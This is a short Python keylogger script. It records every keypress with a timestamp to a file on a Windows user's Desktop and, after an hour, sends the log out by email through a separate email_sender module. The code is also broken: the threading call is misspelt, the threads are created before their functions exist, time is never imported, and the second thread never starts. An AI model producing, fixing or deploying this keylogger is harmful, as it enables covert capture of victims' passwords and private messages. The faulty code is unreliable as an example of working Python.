from pynput.keyboard import Key, Listener
import logging
import email_sender
import threading

t = threading.thread(target=main)
t1 = threading.thread(target=wait)
t.start()

def main():
    log_dir = "C:\\Users\\Akshat\\Desktop\\"

    logging.basicConfig(filename=(log_dir + "detail.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()
def wait():
    time.sleep(3600)
    email_sender.send_it()
